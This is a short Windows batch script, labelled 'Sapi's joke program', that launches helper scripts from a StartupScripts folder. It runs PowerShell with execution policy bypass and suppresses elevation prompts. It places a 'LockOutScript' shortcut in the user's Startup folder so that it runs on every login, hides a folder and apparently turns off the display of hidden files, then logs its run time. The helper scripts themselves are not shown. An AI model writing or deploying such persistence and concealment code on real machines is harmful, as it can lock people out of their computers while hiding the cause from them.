@echo off
break off
set __compat_layer=runasinvoker
cls
goto main

:main
cd StartupScripts
start /min NOSActivationCheck.vbs
Powershell.exe -executionpolicy bypass -f "PsShortcut.ps1"
MOVE LockOutScript.lnk "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
Powershell.exe -executionpolicy bypass -f "HideFolder.ps1"
start UncheckHidden.vbs
cd ..
echo Sapi's joke program ran on %time% >> Running.txt 
exit

:: Original Creation Date: 2/4/2020 10:56 AM ::